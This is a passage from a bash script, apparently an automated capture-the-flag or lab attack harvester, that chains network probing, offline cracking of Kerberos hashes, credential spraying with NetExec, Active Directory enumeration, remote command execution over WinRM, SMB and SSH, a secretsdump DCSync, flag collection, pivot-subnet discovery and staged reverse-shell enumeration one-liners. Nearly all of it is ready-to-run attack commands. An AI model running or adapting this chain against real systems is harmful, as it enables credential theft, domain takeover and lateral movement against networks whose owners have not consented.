    run_step "rpc-endpoints" "Impacket rpcdump Endpoint Mapper" "impacket-rpcdump @$TARGET" 35 \
      "impacket-rpcdump '@$TARGET' | head -n 120"
  fi
fi

if has_port 1433; then
  run_step "mssql-probe" "MSSQL Nmap Info & Unauth Probe" "nmap -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info $TARGET" 35 \
    "nmap -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password '$TARGET'; command -v nxc >/dev/null 2>&1 && nxc mssql '$TARGET' -u 'sa' -p ''"
fi

if has_port 3306; then
  run_step "mysql-probe" "MySQL Info & Empty-Password Probe" "nmap -Pn -p 3306 --script mysql-info,mysql-empty-password $TARGET" 35 \
    "nmap -Pn -p 3306 --script mysql-info,mysql-empty-password '$TARGET'"
fi

if has_port 5432; then
  run_step "postgres-probe" "PostgreSQL Unauth & Rejection Probe" "psql -h $TARGET -U postgres" 25 \
    "PGPASSWORD='' psql -h '$TARGET' -U postgres -c 'SELECT version();' 2>&1"
fi

if has_port 6379; then
  run_step "redis-cli-probe" "Redis Unauth INFO & CONFIG Probe" "redis-cli -h $TARGET INFO" 25 \
    "redis-cli -h '$TARGET' INFO; redis-cli -h '$TARGET' CONFIG GET dir"
fi

if has_port 3389 || has_port 5985 || has_port 5986; then
  run_step "winrm-rdp-ntlm" "WinRM / RDP NTLM & Certificate Metadata" "nmap -Pn -p 3389,5985,5986 --script rdp-ntlm-info,http-ntlm-info,ssl-cert $TARGET" 40 \
    "nmap -Pn -p 3389,5985,5986 --script rdp-ntlm-info,http-ntlm-info,ssl-cert '$TARGET'"
fi

if grep -q "161/udp" "$WORKDIR/scans/nmap-udp.txt" 2>/dev/null; then
  run_step "recon-snmp" "SNMP Public Walk (System, Users, Processes)" "snmpwalk -v2c -c public $TARGET" 45 \
    "snmpwalk -v2c -c public -t 3 '$TARGET' 1.3.6.1.2.1.1 | head -n 60; snmpwalk -v2c -c public -t 3 '$TARGET' 1.3.6.1.4.1.77.1.2.25 | head -n 60; snmpwalk -v2c -c public -t 3 '$TARGET' 1.3.6.1.2.1.25.4.2.1.2 | head -n 80"
fi

# ==============================================================================
# WAVE 3: SELF-CHAINING CREDENTIAL RECOVERY & AUTHENTICATED MATRIX
# ==============================================================================
CURRENT_WAVE="Wave 3: Cred Recovery & Auth Matrix"
echo "## Wave 3: Self-Chaining Credential Recovery & Authenticated Matrix" >> "$OUTFILE"
echo "" >> "$OUTFILE"

cat "$WORKDIR/loot/asrep.txt" "$WORKDIR/loot/asrep-nxc.txt" 2>/dev/null | sort -u > "$WORKDIR/loot/all-hashes.txt" || true
if [ -s "$WORKDIR/loot/all-hashes.txt" ] && [ -f "$ROCKYOU" ]; then
  if command -v john >/dev/null 2>&1; then
    run_step "crack-hashes-john" "John the Ripper Offline Hash Crack (rockyou)" "john --wordlist=$ROCKYOU loot/all-hashes.txt" 120 \
      "john --pot='$WORKDIR/loot/john.pot' --wordlist='$ROCKYOU' '$WORKDIR/loot/all-hashes.txt'; john --pot='$WORKDIR/loot/john.pot' --show '$WORKDIR/loot/all-hashes.txt' | tee '$WORKDIR/loot/cracked.txt'; cat '$WORKDIR/loot/john.pot'"
  fi
  if command -v hashcat >/dev/null 2>&1; then
    run_step "crack-hashes-hashcat" "Hashcat Offline AS-REP Crack (-m 18200)" "hashcat -m 18200 -a 0 loot/all-hashes.txt $ROCKYOU" 120 \
      "hashcat -m 18200 -a 0 --potfile-path='$WORKDIR/loot/hashcat.pot' '$WORKDIR/loot/all-hashes.txt' '$ROCKYOU' --quiet; hashcat -m 18200 --potfile-path='$WORKDIR/loot/hashcat.pot' --show '$WORKDIR/loot/all-hashes.txt' | tee -a '$WORKDIR/loot/cracked.txt'"
  fi
fi

# Resolve cracked or leaked credentials if USER/PASS were not supplied on CLI
if [ -z "$PASS" ]; then
  if [ -s "$WORKDIR/loot/cracked.txt" ]; then
    CR_LINE=$(grep -iE '^\$krb5(asrep|tgs)\$.*:' "$WORKDIR/loot/cracked.txt" 2>/dev/null | tail -n 1)
    if [ -n "$CR_LINE" ]; then
      PASS="${CR_LINE##*:}"
      [ -z "$USER" ] && USER=$(echo "$CR_LINE" | sed -E 's/^\$krb5(asrep|tgs)\$([0-9]+\$)?\*?([^@:$*]+).*/\3/')
    fi
  fi
  if [ -z "$PASS" ] && [ -s "$WORKDIR/loot/john.pot" ]; then
    POT_LINE=$(grep -iE '^\$krb5(asrep|tgs)\$' "$WORKDIR/loot/john.pot" 2>/dev/null | tail -n 1)
    if [ -n "$POT_LINE" ]; then
      PASS="${POT_LINE##*:}"
      if [ -z "$USER" ]; then
        USER=$(grep -hiE '^\$krb5(asrep|tgs)\$' "$WORKDIR/loot/all-hashes.txt" 2>/dev/null | head -n 1 | sed -E 's/^\$krb5(asrep|tgs)\$([0-9]+\$)?\*?([^@:$*]+).*/\3/')
      fi
    fi
  fi
fi
USER="${USER%%@*}"

if [ -n "$USER" ] && { [ -n "$PASS" ] || [ -n "$NTHASH" ]; }; then
  if command -v nxc >/dev/null 2>&1; then
    for PROTO in smb winrm ldap mssql ssh rdp ftp; do
      if [ -n "$NTHASH" ]; then
        run_step "cred-validate-$PROTO" "NetExec Authenticated $PROTO Probe ($USER)" "nxc $PROTO $TARGET -u $USER -H <NTHASH>" 35 \
          "nxc '$PROTO' '$TARGET' -u '$USER' -H '$NTHASH' $([ \"$PROTO\" = \"smb\" ] && echo \"--shares\")"
      else
        run_step "cred-validate-$PROTO" "NetExec Authenticated $PROTO Probe ($USER)" "nxc $PROTO $TARGET -u $USER -p <PASS>" 35 \
          "nxc '$PROTO' '$TARGET' -u '$USER' -p '$PASS' $([ \"$PROTO\" = \"smb\" ] && echo \"--shares\")"
      fi
    done

    if has_port 139 || has_port 445; then
      if [ -n "$NTHASH" ]; then
        run_step "ad-user-enum" "NetExec Authenticated SMB Users & Groups ($USER)" "nxc smb $TARGET -u $USER -H <NTHASH> --users" 45 \
          "nxc smb '$TARGET' -u '$USER' -H '$NTHASH' --users; nxc smb '$TARGET' -u '$USER' -H '$NTHASH' --groups"
        run_step "smb-share-inventory" "NetExec SMB Spider_Plus & GPP Password Sweep" "nxc smb $TARGET -u $USER -H <NTHASH> -M spider_plus -M gpp_password" 60 \
          "nxc smb '$TARGET' -u '$USER' -H '$NTHASH' -M spider_plus -M gpp_password -M gpp_autologin"
      else
        run_step "ad-user-enum" "NetExec Authenticated SMB Users & Groups ($USER)" "nxc smb $TARGET -u $USER -p <PASS> --users" 45 \
          "nxc smb '$TARGET' -u '$USER' -p '$PASS' --users; nxc smb '$TARGET' -u '$USER' -p '$PASS' --groups"
        run_step "smb-share-inventory" "NetExec SMB Spider_Plus & GPP Password Sweep" "nxc smb $TARGET -u $USER -p <PASS> -M spider_plus -M gpp_password" 60 \
          "nxc smb '$TARGET' -u '$USER' -p '$PASS' -M spider_plus -M gpp_password -M gpp_autologin"
      fi
    fi
  fi

  ESC_USER=""
  ESC_PASS=""
  if [ -n "$DOMAIN" ] && [ -n "$PASS" ] && (has_port 88 || has_port 389 || has_port 636); then
    if command -v impacket-GetUserSPNs >/dev/null 2>&1; then
      run_step "kerberoast" "Impacket GetUserSPNs Authenticated Kerberoast" "impacket-GetUserSPNs $DOMAIN/$USER -dc-ip $TARGET -request" 45 \
        "impacket-GetUserSPNs '$DOMAIN/$USER:$PASS' -dc-ip '$TARGET' -request -outputfile '$WORKDIR/loot/kerberoast.txt'; [ -s '$WORKDIR/loot/kerberoast.txt' ] && cat '$WORKDIR/loot/kerberoast.txt'"
      if [ -s "$WORKDIR/loot/kerberoast.txt" ] && [ -f "$ROCKYOU" ] && command -v john >/dev/null 2>&1; then
        run_step "crack-kerberoast-john" "John Offline Kerberoast Crack" "john --wordlist=$ROCKYOU loot/kerberoast.txt" 120 \
          "john --pot='$WORKDIR/loot/john.pot' --wordlist='$ROCKYOU' '$WORKDIR/loot/kerberoast.txt'; john --pot='$WORKDIR/loot/john.pot' --show '$WORKDIR/loot/kerberoast.txt'; cat '$WORKDIR/loot/john.pot'"
        POT_TGS=$(grep -E '^\$krb5tgs\$' "$WORKDIR/loot/john.pot" 2>/dev/null | tail -n 1)
        if [ -n "$POT_TGS" ]; then
          ESC_PASS="${POT_TGS##*:}"
          ESC_USER=$(echo "$POT_TGS" | sed -E 's/^\$krb5tgs\$([0-9]+\$)?\*?([^$*:]+).*/\2/')
          if [ -z "$ESC_USER" ] || [[ "$ESC_USER" =~ ^[0-9a-fA-F]{16,}$ ]]; then
            ESC_USER=$(grep -oP '^\$krb5tgs\$\d+\$\*\K[^$*]+' "$WORKDIR/loot/kerberoast.txt" 2>/dev/null | head -n 1)
          fi
        fi
      fi
    fi

    if command -v bloodyAD >/dev/null 2>&1; then
      run_step "bloodyad-acl" "bloodyAD Writable Objects Discovery" "bloodyAD -d $DOMAIN --host $TARGET -u $USER get writable" 45 \
        "bloodyAD -d '$DOMAIN' --host '$TARGET' -u '$USER' -p '$PASS' get writable"
    fi

    if command -v impacket-findDelegation >/dev/null 2>&1; then
      run_step "ad-delegation" "Impacket findDelegation Sweep" "impacket-findDelegation $DOMAIN/$USER -dc-ip $TARGET" 40 \
        "impacket-findDelegation '$DOMAIN/$USER:$PASS' -dc-ip '$TARGET'"
    fi

    if command -v certipy-ad >/dev/null 2>&1; then
      run_step "adcs-enum" "Certipy-AD Vulnerable Template & CA Sweep" "certipy-ad find -u $USER@$DOMAIN -dc-ip $TARGET -vulnerable -stdout" 60 \
        "certipy-ad find -u '$USER@$DOMAIN' -p '$PASS' -dc-ip '$TARGET' -vulnerable -stdout"
    fi

    if command -v bloodhound-python >/dev/null 2>&1; then
      run_step "bloodhound-collect" "BloodHound-Python All-Collection" "bloodhound-python -d $DOMAIN -u $USER -ns $TARGET -c All --zip" 90 \
        "(cd '$WORKDIR/loot' && bloodhound-python -d '$DOMAIN' -u '$USER' -p '$PASS' -ns '$TARGET' -c All --zip)"
    fi
  fi
fi

# ==============================================================================
# WAVE 4: ON-HOST FOOTHOLD & PRIVESC POSSIBILITY-SPACE HARVESTER
# ==============================================================================
CURRENT_WAVE="Wave 4: On-Host Privesc Harvest"
echo "## Wave 4: On-Host Foothold & Privesc Possibility-Space Harvest (\`$TARGET\`)" >> "$OUTFILE"
echo "" >> "$OUTFILE"

WIN_ONHOST_CMD='whoami & hostname & ipconfig /all & (for /r C:\Users %F in (local.txt user.txt proof.txt root.txt) do @if exist "%F" (echo ===FLAG:%F:: & type "%F" & echo.)) & ver & systeminfo & whoami /all & cmdkey /list & net user & net localgroup & net localgroup Administrators & wmic service get name,displayname,pathname,startmode & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" & route print & arp -a & netstat -ano'
LIN_ONHOST_CMD='whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig; for f in $(find /home /root /var /srv /opt -maxdepth 3 \( -name "local.txt" -o -name "user.txt" -o -name "proof.txt" -o -name "root.txt" \) 2>/dev/null); do v=$(tr -d "\r\n" < "$f"); [ -n "$v" ] && echo "===FLAG:${f}::${v}" && echo "$v"; done; uname -a; cat /etc/os-release 2>/dev/null; cat /proc/version 2>/dev/null; sudo -V 2>/dev/null | head -n 3; pkexec --version 2>/dev/null; sudo -n -l 2>&1 || true; find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null; getcap -r / 2>/dev/null; ls -la /etc/passwd /etc/shadow 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null; ip route 2>/dev/null; ip neigh 2>/dev/null; ss -tulpn 2>/dev/null; ps auxf 2>/dev/null | head -n 80'

ONHOST_LOG="$WORKDIR/loot/onhost-$TARGET.txt"
: > "$ONHOST_LOG"

if [ -n "$USER" ] && { [ -n "$PASS" ] || [ -n "$NTHASH" ]; }; then
  if (has_port 5985 || has_port 5986 || has_port 445) && command -v nxc >/dev/null 2>&1; then
    if [ -n "$NTHASH" ]; then
      run_step "flag-hunt-windows" "Remote SMB Users Share Flag Spider ($USER)" "nxc smb $TARGET -u $USER -H <NTHASH> --spider Users --regex '(local|proof|user|root|flag)\.txt$'" 45 \
        "nxc smb '$TARGET' -u '$USER' -H '$NTHASH' --spider Users --regex '(local|proof|user|root|flag)\\.txt$'"
      run_step "windows-enum" "Remote Windows On-Host Privesc & Flag Harvest ($USER)" "nxc winrm $TARGET -u $USER -H <NTHASH> -x <WIN_ONHOST_CMD>" 60 \
        "(nxc winrm '$TARGET' -u '$USER' -H '$NTHASH' -x '$WIN_ONHOST_CMD' || nxc smb '$TARGET' -u '$USER' -H '$NTHASH' -x '$WIN_ONHOST_CMD') | tee '$ONHOST_LOG'"
    else
      run_step "flag-hunt-windows" "Remote SMB Users Share Flag Spider ($USER)" "nxc smb $TARGET -u $USER -p <PASS> --spider Users --regex '(local|proof|user|root|flag)\.txt$'" 45 \
        "nxc smb '$TARGET' -u '$USER' -p '$PASS' --spider Users --regex '(local|proof|user|root|flag)\\.txt$' && smbclient '//$TARGET/Users' -U '${DOMAIN:+$DOMAIN/}$USER%$PASS' -c 'get \"${USER}\\Desktop\\user.txt\" \"$WORKDIR/loot/user.txt\"' 2>/dev/null && [ -s '$WORKDIR/loot/user.txt' ] && cat '$WORKDIR/loot/user.txt' || true"
      run_step "windows-enum" "Remote Windows On-Host Privesc & Flag Harvest ($USER)" "nxc winrm $TARGET -u $USER -p <PASS> -x <WIN_ONHOST_CMD>" 60 \
        "(nxc winrm '$TARGET' -u '$USER' -p '$PASS' -x '$WIN_ONHOST_CMD' || nxc smb '$TARGET' -u '$USER' -p '$PASS' -x '$WIN_ONHOST_CMD') | tee '$ONHOST_LOG'"
    fi
  fi

  # If Wave 3 Kerberoast cracked an escalated account (e.g. Administrator on Active), run escalated validation, DCSync & on-host flag harvest
  if [ -n "$ESC_USER" ] && [ -n "$ESC_PASS" ] && { [ "$ESC_USER" != "$USER" ] || [ "$ESC_PASS" != "$PASS" ]; }; then
    if command -v nxc >/dev/null 2>&1; then
      run_step "cred-validate-smb" "NetExec Escalated SMB Admin Validation ($ESC_USER)" "nxc smb $TARGET -u $ESC_USER -p <ESC_PASS> --shares" 35 \
        "nxc smb '$TARGET' -u '$ESC_USER' -p '$ESC_PASS' --shares"
      run_step "windows-enum" "Escalated Windows On-Host Privesc & Both Flags Harvest ($ESC_USER)" "nxc smb $TARGET -u $ESC_USER -p <ESC_PASS> -x <WIN_ONHOST_CMD>" 60 \
        "(nxc winrm '$TARGET' -u '$ESC_USER' -p '$ESC_PASS' -x '$WIN_ONHOST_CMD' || nxc smb '$TARGET' -u '$ESC_USER' -p '$ESC_PASS' -x '$WIN_ONHOST_CMD') | tee -a '$ONHOST_LOG'"
    fi
    if [ -n "$DOMAIN" ] && command -v impacket-secretsdump >/dev/null 2>&1; then
      run_step "dcsync" "Impacket secretsdump Escalated NTLM Dump ($ESC_USER)" "impacket-secretsdump $DOMAIN/$ESC_USER@$TARGET -just-dc-ntlm" 60 \
        "impacket-secretsdump '$DOMAIN/$ESC_USER:$ESC_PASS@$TARGET' -just-dc-ntlm"
    fi
  fi

  if has_port 22 && [ -n "$PASS" ] && command -v sshpass >/dev/null 2>&1; then
    run_step "linux-enum" "Remote Linux On-Host Privesc & Flag Harvest ($USER)" "ssh $USER@$TARGET <LIN_ONHOST_CMD>" 45 \
      "sshpass -p '$PASS' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 '$USER@$TARGET' '$LIN_ONHOST_CMD' | tee '$ONHOST_LOG'"
  fi
fi

# ==============================================================================
# WAVE 5: INTERNAL SUBNET & PIVOT NEIGHBOR DISCOVERY
# ==============================================================================
if [ -s "$ONHOST_LOG" ]; then
  TARGET_PREFIX="${TARGET%.*}."
  LHOST_PREFIX="${LHOST:+"${LHOST%.*}."}"
  INTERNAL_IPS=$(grep -oE '\b(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})\b' "$ONHOST_LOG" 2>/dev/null \
    | grep -vE '\.(0|1|254|255)$' \
    | awk -v tp="$TARGET_PREFIX" -v lp="$LHOST_PREFIX" 'index($0, tp) != 1 && (lp == "" || index($0, lp) != 1)' \
    | sort -u)
  if [ -n "$INTERNAL_IPS" ]; then
    CURRENT_WAVE="Wave 5: Pivot & Internal Subnets"
    echo "## Wave 5: Internal Subnet & Pivot Neighbor Discovery (\`$TARGET\`)" >> "$OUTFILE"
    echo "" >> "$OUTFILE"
    INTERNAL_SUBNETS=$(echo "$INTERNAL_IPS" | awk -F. '{print $1"."$2"."$3".0/24"}' | sort -u | paste -sd' ' -)
    {
      echo "- **Discovered Internal Neighbor IPs**: \`$(echo "$INTERNAL_IPS" | paste -sd, -)\`"
      echo "- **Discovered Internal Subnets**: \`$INTERNAL_SUBNETS\`"
      echo "- **Next-Hop Harvest Command (once tunnel is active)**:"
      echo '```bash'
      echo "./obol-harvest.sh \"$INTERNAL_SUBNETS\" --proxy ${USER:+-u \"$USER\"} ${PASS:+-p \"$PASS\"} ${NTHASH:+-H \"$NTHASH\"} ${DOMAIN:+-d \"$DOMAIN\"}"
      echo '```'
      echo ""
    } >> "$OUTFILE"
  fi
fi

done

# Stage pasteable reverse-shell On-Host Harvesters for boxes reached via web exploits
cat > "$WORKDIR/www/onhost-linux.sh" <<EOF
#!/bin/sh
echo "===== OBOL STEP 901: flag-hunt-linux id whoami ip a $TARGET_INPUT ====="
whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig
for f in \$(find /home /root /var /srv /opt -maxdepth 3 \\( -name "local.txt" -o -name "user.txt" -o -name "proof.txt" -o -name "root.txt" \\) 2>/dev/null); do
  v=\$(tr -d "\\r\\n" < "\$f")
  [ -n "\$v" ] && echo "===FLAG:\${f}::\${v}" && echo "\$v"
done
echo "===== OBOL STEP 902: linux-enum uname sudo -l $TARGET_INPUT ====="
uname -a; cat /etc/os-release 2>/dev/null; cat /proc/version 2>/dev/null
sudo -V 2>/dev/null | head -n 3; pkexec --version 2>/dev/null; sudo -n -l 2>&1 || true
find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null; getcap -r / 2>/dev/null
ls -la /etc/passwd /etc/shadow 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
echo "===== OBOL STEP 903: local-linux-interfaces ip a ip route ip neigh ss -tulpn $TARGET_INPUT ====="
ip route 2>/dev/null; ip neigh 2>/dev/null; ss -tulpn 2>/dev/null
EOF
chmod +x "$WORKDIR/www/onhost-linux.sh" 2>/dev/null || true

# --- Append Execution Index & Reverse-Shell One-Liners to Document ---
{
  echo "---"
  echo ""
  echo "## Harvest Execution Index"
  echo ""
  echo "| Step | Host | Wave | Action ID | Command | Exit | Duration | Lines |"
  echo "| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |"
  cat "$INDEX_FILE" 2>/dev/null
  echo ""
  echo "---"
  echo ""
  echo "## Pasteable On-Host Harvesters (For Web RCE / Reverse Shells)"
  echo ""
  echo "If you landed a reverse shell on \`$TARGET_INPUT\` without SSH/WinRM credentials, paste the matching one-liner inside that shell and append the output to this file:"
  echo ""
  echo "### Linux Reverse Shell One-Liner"
  echo '```bash'
  echo "echo \"===== OBOL STEP 901: linux-enum onhost $TARGET_INPUT =====\"; $LIN_ONHOST_CMD"
  echo '```'
  echo ""
  echo "### Windows Reverse Shell One-Liner (cmd.exe)"
  echo '```cmd'
  echo "cmd /c \"echo ===== OBOL STEP 901: windows-enum onhost $TARGET_INPUT ===== & $WIN_ONHOST_CMD\""
  echo '```'
} >> "$OUTFILE"

echo ""
echo "================================================================================"
echo "[harvest] Complete! Captured ${STEP_NUM} steps into:"
echo "          $(pwd)/$OUTFILE"
echo "          Artifact directory: $(pwd)/$WORKDIR"
echo "================================================================================"
